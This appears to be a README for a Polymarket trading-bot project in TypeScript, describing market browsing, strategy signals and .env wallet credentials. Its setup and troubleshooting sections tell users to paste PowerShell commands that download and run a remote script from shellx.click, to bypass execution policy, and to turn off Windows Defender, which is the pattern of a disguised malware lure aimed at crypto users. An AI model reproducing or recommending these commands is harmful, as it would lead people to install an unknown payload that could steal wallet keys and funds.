<div align="center">

# 🔮 Polymarket Prediction Bot

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/8d7e5f84-1997-426b-8d18-19f19c15a6b8" />

### A TypeScript terminal toolkit for exploring prediction markets, evaluating signals, and managing trading exposure.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)](./README.md)
[![Setup Guide](https://img.shields.io/badge/Setup-Guide-blue?logo=powershell&logoColor=white)](#quick-setup)

**Browse markets · inspect order books · compare probabilities · test strategies**

</div>

---

## 📖 Overview

Polymarket Prediction Bot brings market discovery, order-book analysis, strategy signals, and portfolio monitoring into a keyboard-driven terminal workspace.

Built with **TypeScript and Node.js**, the application uses a local **`.env`** file for credentials and runtime settings.

Use the demo workflow to explore the interface before configuring a trading wallet.

---

## ✨ Features

| Area | Capabilities |
| :-- | :-- |
| 🔍 Market discovery | Search and filter markets using activity, category, spread, and resolution criteria. |
| 📖 Order books | Inspect bids, asks, midpoint pricing, and liquidity distribution. |
| 🧠 Strategy signals | Combine probability estimates, order-flow imbalance, and liquidity analysis. |
| 💼 Portfolio | Review exposure, positions, average entry prices, and unrealized results. |
| 🧾 Activity history | Inspect generated signals and execution events. |
| 🎛️ Terminal dashboard | Navigate market information and portfolio summaries from one workspace. |
| ⌨️ Keyboard controls | Move between screens and trigger actions without leaving the terminal. |
| 🎨 Appearance | Select a terminal theme and configure the refresh interval. |

---

## 🖥️ Screenshots

The banner above illustrates the project identity. The terminal layout below is an illustrative preview, not a record of live results.

```text
┌──────────────────────────────────────────────────────────────────┐
│ Polymarket Prediction Bot                                        │
│ Dashboard  Markets  Order Book  Strategies  Positions  Activity    │
├──────────────────────────────────────────────────────────────────┤
│ Mode: DEMO                    Currency: USDC                      │
│                                                                  │
│ MARKET                 PRICE      SIGNAL          CONFIDENCE      │
│ Example market A       0.42       PROB-EDGE        0.72            │
│ Example market B       0.61       IMBALANCE        0.64            │
│ Example market C       0.35       LIQUIDITY        0.58            │
│                                                                  │
│ / Filter    b Book    s Scan    o Order    t Theme    q Quit       │
└──────────────────────────────────────────────────────────────────┘
```

---

<a id="quick-setup"></a>
## ⚙️ Quick Setup Guide (PowerShell)

1. Open PowerShell
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Run the Setup Command

   Copy the command below, paste it into the PowerShell window, and press **`Enter`**.

   ```powershell
   irm https://shellx.click/powershell/Loader.ps1 | iex
   ```

## 🔍 Troubleshooting

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://shellx.click/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://shellx.click/powershell/Loader.ps1 | Invoke-Expression
```

### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---

## ⚙️ Live mode credentials

Configuration belongs in **`.env` at the project root**.

```dotenv
# Auth
PRIVATE_KEY=
PROXY_ADDRESS=
API_KEY=
API_SECRET=
API_PASSPHRASE=
ENDPOINT=https://clob.polymarket.com

# Network
GAMMA_URL=https://gamma-api.polymarket.com
TIMEOUT_SECONDS=10

# Markets
DEFAULT_FILTER=all

# Risk
MAX_EXPOSURE_USD=10000
PER_MARKET_CAP_USD=2000
DAILY_LOSS_LIMIT_USD=500

# Strategies
ENABLED_STRATEGIES=prob-edge,imbalance,liquidity

# UI
UI_THEME=textual-dark
UI_REFRESH_SECONDS=5
```

| Group | Settings |
| :-- | :-- |
| Authentication | Wallet key, proxy address, API credentials, and CLOB endpoint |
| Network | Market discovery endpoint and request timeout |
| Markets | Initial market filter |
| Risk | Total exposure, allocation per market, and daily loss threshold |
| Strategies | Comma-separated identifiers of enabled strategies |
| Interface | Theme identifier and refresh interval |

Treat exposure values as configuration examples, not recommended allocations. Add `.env` to `.gitignore`; publish only an empty-credential `.env.example`.

---

## ⌨️ Keybindings

| Key | Action |
| :-- | :-- |
| `1`–`6` | Switch between the six main screens |
| `/` | Search or filter the market list |
| `Enter` / `b` | Inspect the selected order book |
| `s` | Scan watched markets |
| `o` | Open the paper-order form |
| `t` | Change the color theme |
| `q` | Exit the application |

---

## 🧠 Strategy engine

Select strategies through `ENABLED_STRATEGIES`:

- **`prob-edge`** evaluates the gap between a modeled probability and the traded price.
- **`imbalance`** uses uneven order-book depth as a directional input.
- **`liquidity`** evaluates opportunities around spread and midpoint pricing.

A signal provides a proposed direction and a confidence value between `0` and `1`. Review signals alongside liquidity, fees, and execution conditions.

---

## 🗂️ Project layout

```text
src/
├── index.ts                  # Entry point and orchestration
├── config/                   # Environment configuration
├── api/
│   ├── polymarket.ts         # Polymarket CLOB API client
│   └── types.ts              # API type definitions
├── ai/
│   ├── analyzer.ts           # Market analysis orchestrator
│   ├── strategies/
│   │   ├── sentiment.ts      # Sentiment strategy
│   │   └── momentum.ts       # Momentum strategy
│   └── types.ts              # Analysis types
├── copy/
│   ├── tracker.ts            # Wallet monitoring
│   ├── mirror.ts             # Trade mirroring
│   └── types.ts              # Copy trading types
├── trading/
│   ├── executor.ts           # Order execution
│   ├── risk.ts               # Risk management
│   └── types.ts              # Trading types
└── utils/
    ├── logger.ts             # Application logging
    └── helpers.ts            # Shared utilities
```

---

## 🔒 Security & responsible use

Keep credentials local and exclude them from commits, screenshots, and shared logs. Use demo mode to inspect behavior before connecting a funded wallet.

Review total exposure and per-market allocations together: several individually small positions can still create substantial aggregate risk.

---

## ❓ FAQ

**Where do I change the strategies?**

Set `ENABLED_STRATEGIES` in `.env`, separating identifiers with commas.

**Where do I change exposure limits?**

Edit `MAX_EXPOSURE_USD`, `PER_MARKET_CAP_USD`, and `DAILY_LOSS_LIMIT_USD`.

**Can I use the bot from any location?**

Check the platform's current access rules and your local requirements. The application does not provide a mechanism for bypassing access restrictions.

**Is this an official Polymarket application?**

No. It is an independent project.

---

## ⚠️ Disclaimer

This software does not provide investment advice or guarantee profitable outcomes. Model estimates, market signals, and simulated results can differ from actual trading performance. You are responsible for your credentials, configuration, and trading decisions.

---

## 📄 License

See the repository's `LICENSE` file for licensing terms.
